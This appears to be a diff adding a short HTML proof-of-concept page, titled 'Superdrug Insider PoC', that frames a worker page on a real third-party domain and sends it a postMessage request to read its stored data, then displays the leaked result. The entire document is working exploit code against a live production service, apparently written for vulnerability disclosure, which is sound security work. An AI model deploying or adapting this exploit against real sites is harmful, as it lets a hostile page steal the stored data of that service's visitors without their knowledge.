@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h2>Superdrug Insider PoC</h2>
+
+<iframe id="w" src="https://superdrug.api.useinsider.com/worker-new.html"></iframe>
+
+<script>
+setTimeout(() => {
+  const f = document.getElementById('w');
+
+  const mc = new MessageChannel();
+  mc.port1.onmessage = e => {
+    console.log("LEAK:", e.data);
+    document.body.innerHTML += "<pre>" + JSON.stringify(e.data, null, 2) + "</pre>";
+  };
+
+  f.contentWindow.postMessage(
+    { channel: true, type: 'storageData', message: { action: 'read' } },
+    '*',
+    [mc.port2]
+  );
+}, 2000);
+</script>
+
+</body>
+</html>
